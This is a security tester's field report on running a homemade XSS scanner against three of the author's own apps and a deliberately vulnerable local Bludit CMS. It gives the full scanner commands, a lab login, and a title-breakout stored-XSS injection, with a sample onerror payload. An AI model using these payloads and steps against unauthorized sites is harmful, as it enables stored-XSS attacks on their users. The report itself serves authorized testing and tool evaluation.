# Four targets in one afternoon: what v3.10 actually did in the wild

> **TL;DR** — After the [v3.10 pass](10-one-shape-was-never-enough.md)
> landed (payload variants + WAF-bypass mutations, 101 pytest cases),
> the bot got pointed at four running targets in one sitting: three
> own-code projects (`hotel-platform` React + Spring Boot, `mahrem`
> FastAPI + vanilla JS, `wallet-api` ASP.NET Core) and one deliberately
> vulnerable CMS (`Bludit 3.16.2` in local Docker). The three modern
> API-first projects returned exactly what the tool's precision chain
> should return on them: **75 findings, all scored `json-only`, 0
> `executable`, 0 `breakout-req`** — the Content-Type gate held; a
> reflection in a JSON response is not a browser exploit no matter
> how many mutations you throw at it. Bludit, the intentionally
> HTML-rendering target, returned the whole point of the v3.10 pass:
> with `--variants body` the tag stored XSS scored `breakout-req` (the
> canary landed in `<title>` and the bot correctly said "escape needed
> first"); with `--variants title-breakout` on the *same target, same
> sink, same login* it scored **`executable`** — the marker cleared
> the title context and the class is directly triggerable. That
> before/after pair is the concrete proof of the v3.10 severity
> upgrade rule, no more theoretical.

This writeup is a field report, not another feature dive. Everything
below is what the bot actually printed on my terminal on **2026-09-26**
against running services. Reports are checked into
[`../reports/2026-09-26-v310-live/`](../reports/2026-09-26-v310-live/).

## The line-up

| Target | Stack | Why in the sample | Auth | Where the canary went |
|---|---|---|---|---|
| **hotel-platform** | React 18 + Spring Boot 3 + MySQL | Own project. Repeat target since [writeup 09](09-three-high-to-one-a-precision-journey.md). | Bearer JWT | `PUT /api/candidate/profile` → `fullName` |
| **mahrem** (ex health-blockchain) | FastAPI + vanilla JS front-end | Own project. Public HTML landing plus API. | none for public surface | reflected crawl + 4-header probe |
| **wallet-api** | ASP.NET Core 8 + PostgreSQL 18 | Own project. Pure JSON REST + Swagger. | Bearer JWT | `POST /api/Transactions/transfer` → `description` |
| **Bludit 3.16.2** | PHP CMS in local Docker | Deliberately vulnerable [tag stored XSS](06-building-an-xss-bot.md). | session cookie via `--login` | `POST /admin/new-content` → `tags` |

Every command was `python dxadyn.py` from
[`tools/dom-xss-analyzer/dxadyn.py`](../tools/dom-xss-analyzer/dxadyn.py)
on a fresh clone; no local wrapper, no manual mutation.

## Test A — hotel-platform: 25 shapes, one right verdict

The command was one line (JWT captured beforehand, PUT dispatch, JSON
body, canary in `fullName`):

```bash
python dxadyn.py --stored \
  --header "Authorization: Bearer $JWT" \
  --method put --csrf-field "" \
  --target "http://localhost:8081/api/candidate/profile" \
  --json-body '{"fullName":"{CANARY}", "phone":"05551000000", ...}' \
  --check "http://localhost:8081/api/candidate/profile" \
  --variants all --waf-bypass
```

`--variants all --waf-bypass` = 5 variants × (1 + 4 mutations) = **25
distinct submits**, each with its own cid, its own marker, its own
verdict pass. The bot printed 25 finding rows, one per shape:

```
[JSON-ONLY] context=json-body                                    variant=body
[JSON-ONLY] context=json-body variant=body/case
[JSON-ONLY] context=json-body variant=body/split-cmt
[JSON-ONLY] context=json-body variant=body/whitespace
[JSON-ONLY] context=json-body variant=body/url-encode
[JSON-ONLY] context=json-body variant=title-breakout
[JSON-ONLY] context=json-body variant=title-breakout/case
...
[JSON-ONLY] context=json-body variant=url-scheme/url-encode

25 unique stored candidate(s) - 0 EXECUTABLE, 0 need a follow-on breakout.
```

Every canary landed in the response body (Spring's `Jackson` serialised
`fullName` back verbatim in the JSON DTO). Every content-type header
was `application/json`. Every variant, including the four `-breakout`
ones that would have upgraded on HTML, stayed `json-only`. That is
the v3.7 Content-Type gate holding under 25× pressure: **the browser
does not parse `application/json` as HTML**, so a stored reflection
there is not a browser-executable XSS, no matter which shape got in.

Would the operator want to know? Yes — a stored raw string in a JSON
response is still worth reviewing (a downstream client might feed it
into `dangerouslySetInnerHTML`), which is why the tool reports it at
all. But it is not scored as an exploit that fires in isolation, and
that discipline held.

## Test B — mahrem: 25 shapes × N inputs × 4 headers, zero reflections

Mahrem serves an HTML landing page and API endpoints. Its public
surface was probed with `--variants all --waf-bypass` at depth 2, plus
a header probe on the four common upstream headers a reverse-proxy
app tends to echo:

```bash
python dxadyn.py http://127.0.0.1:8000/ --depth 2 \
  --variants all --waf-bypass \
  --probe-headers "X-Forwarded-For,Referer,User-Agent,X-Real-IP"
```

Result:

```
[dxadyn] probing http://127.0.0.1:8000/ (depth=2) variants=[body,title-breakout,
  attr-breakout,script-breakout,url-scheme] +waf-bypass(x4/variant)
[dxadyn] header probe: X-Forwarded-For, Referer, User-Agent, X-Real-IP
No unencoded reflections found. (Inputs may be encoded, POST-guarded, or absent.)
```

Zero. Static side (dxa on the source repo) reported 78 JS medium-level
sinks — all in the vanilla JS front-end (`element.innerHTML =` patterns
that a review might harden but that had no observable server-echo
channel) — and **0 Python HIGH**. FastAPI + `JSONResponse` all the way
through, no server-side HTML templating, no header echo. This is the
tool doing the right thing when the target is genuinely quiet: it does
not manufacture findings to look busy.

## Test C — wallet-api: the same discipline on ASP.NET Core

Register a second user Bob (self-transfer is blocked by design — a
small bit of the app's own defense in depth), deposit some balance,
then transfer to Bob with `description="{CANARY}"`. `--variants all
--waf-bypass`, JWT auth:

```
[JSON-ONLY] context=json-body variant=body
[JSON-ONLY] context=json-body variant=body/case
...
[JSON-ONLY] context=json-body variant=url-scheme/url-encode

25 unique stored candidate(s) - 0 EXECUTABLE, 0 need a follow-on breakout.
```

Same shape as hotel-platform. The description string round-trips
through the `POST /transfer` handler, gets written to Postgres, comes
back in `GET /api/Transactions` — every time as a JSON string field
in an `application/json` body. Content-Type gate: `json-only`, 25 for 25.

The reflected pass on `/swagger/index.html` at depth 2 with header
probe returned zero. Swagger UI is a static page; the API endpoints
sit behind auth. Nothing to reflect.

## Test D — Bludit: the point of v3.10, in one before/after

The point of running v3.10 on Bludit was not to find a new bug —
[writeup 06](06-building-an-xss-bot.md) already documented the tag
stored XSS the bot picks up autonomously. The point was to see the
severity upgrade rule (`_apply_ct_gate` variant path) fire against a
real HTML target instead of a unit-test fixture.

Two commands, minimal delta:

```bash
# Command 1: baseline (historical body variant)
python dxadyn.py --stored --auto-check \
  --auto-check-from 'http://localhost:8090/tag/{CID}-dxss' \
  --login http://localhost:8090/admin/login --user admin --pass labpass123 \
  --target http://localhost:8090/admin/new-content --target-field tags \
  --extra "title=v310demo1,slug=v310demo1$RND,content=b,type=published,..."
```

Output:

```
http://localhost:8090/tag/dxa406473f3-dxss  [BREAKOUT-REQ] context=title [auto]
1 unique stored candidate(s) - 0 EXECUTABLE, 1 need a follow-on breakout
```

The canary landed at `<title>tag: dxa...-dxss | Bludit</title>` — raw
survived, but stuck inside the title. Correct v3.5 verdict:
`breakout-req`.

```bash
# Command 2: same target, same login, one flag change
python dxadyn.py --stored --auto-check \
  --auto-check-from 'http://localhost:8090/tag/{CID}-title-dxss' \
  --variants title-breakout \
  --login ... --target ... --target-field tags \
  --extra ...
```

Output:

```
http://localhost:8090/tag/dxa8bbfada8-title-dxss  [EXECUTABLE] context=title
  variant=title-breakout [auto]
1 unique stored candidate(s) - 1 EXECUTABLE, 0 need a follow-on breakout
```

Same sink, different payload shape. The bot submitted
`dxa8bbfada8</title><dXsS>` as the tag value, Bludit slugified it to
`dxa8bbfada8-title-dxss` (angle brackets and slashes reduced to
dashes), and the `/tag/<slug>` page rendered:

```html
<title>tag: dxa8bbfada8</title><dXsS> | Bludit</title>
```

The browser closes the title at the injected `</title>`. The marker
`<dXsS>` is now in body context. If the marker were
`<img src=x onerror=alert(document.domain)>`, an alert would fire on
page load — no operator interaction required. `_apply_ct_gate` saw:

- `reflection = "unencoded"` (marker survived raw)
- `_is_html_response("text/html")` = True
- `variant = "title-breakout"` ends with `"-breakout"`

→ severity upgraded to `executable`. The rule the writeup-10 tests
locked in fired against a real target for the first time on record.

This is the whole thesis of v3.10: **one payload shape can never
distinguish "escape needed" from "escape already done."** The bot's
job is to state whichever verdict is true and be honest about which.
Before v3.10, the operator saw `breakout-req` on this exact target
and had to hand-craft a payload with `</title>` themselves. After
v3.10, the tool did that step and reported `executable`. That is a
minute of triage time saved per finding of this shape, and — more
importantly — a class of exploit that no longer requires operator
skill to *identify*.

## What the four together prove

- **False-positive discipline holds under 25× pressure.** Three JSON
  APIs, each got 25 shapes thrown at them. Every variant found a
  stored reflection. **Zero were scored `executable`.** The
  Content-Type gate is not a checkbox — it stayed rigorous when the
  input surface got wide.
- **Zero-finding runs are also information.** Mahrem returned 0
  reflections across 25 × N inputs × 4 headers at depth 2. The tool
  did not invent noise to fill the report; the report says "nothing
  reached that shape." That is the right output for a well-designed
  target and the same discipline that lets a HIGH mean something when
  it does come back.
- **Variant-aware severity is real, not paper.** Bludit before v3.10:
  `breakout-req`. Bludit after v3.10, one CLI flag changed:
  `executable`. Same sink. The rule works and the runtime path
  exercises it on ordinary HTML web-CMS output.
- **The tool scales across four different runtime stacks with no
  per-target work.** JWT-Spring, JWT-FastAPI, JWT-.NET, cookie-PHP —
  same three flags and same three commands. That is the point of a
  methodology-first tool: it does not care what language wrote the
  sink, it cares what the sink does.

## Honest boundaries this run does *not* cross

- **None of these targets had a real WAF.** The four WAF-bypass
  mutations were fired for completeness (which is why the count is
  25, not 5), but this run did not prove they defeat a production
  rule set. The next honest test is a lab target behind ModSecurity
  with default OWASP CRS on.
- **All Bludit exploits are on a locally patched CMS.** The CVE
  underlying the tag stored XSS is public and patched upstream. The
  v3.10 upgrade would have flagged it before the patch; today it
  demonstrates the tool's behaviour on the sink shape.
- **DOM XSS remained invisible.** All four targets have client-side
  JavaScript. A hash-based DOM XSS (`location.hash → innerHTML`)
  would not have been caught by any of these runs. This is the honest
  known gap; the fix is Playwright, and it is not shipped yet.
- **No blind-XSS out-of-band channel.** A canary that fires in an
  admin panel viewed by another user hours later stays invisible.

## Takeaway

Writeups 06–10 talked about what v3.10 *should* do. This one is a
plain field record of what it *did* do, on 2026-09-26, against four
running services in one sitting. The three modern own-code projects
came back clean — with a report the operator can read and file, not
a wall of low-signal alerts. The intentionally-vulnerable web CMS
came back with a single row upgraded from `breakout-req` to
`executable` on the strength of exactly the payload-shape change the
last writeup was arguing for.

Same source→sink discipline. Same 101-test lock-in. First live
`EXECUTABLE` on record.

---

*Hands-on, on authorized local targets. hotel-platform / mahrem /
wallet-api are the author's own projects. Bludit runs in a
namespaced Docker container. All raw HTML reports for this run are
in [`reports/2026-09-26-v310-live/`](../reports/2026-09-26-v310-live/).
Related: [writeup 06](06-building-an-xss-bot.md) (the Bludit sink,
first documented), [writeup 08](08-what-does-not-shout-matters.md)
(the CT gate this run relies on), [writeup 09](09-three-high-to-one-a-precision-journey.md)
(hotel-platform's static-side story), [writeup 10](10-one-shape-was-never-enough.md)
(the v3.10 rule the Bludit before/after actually proves).*
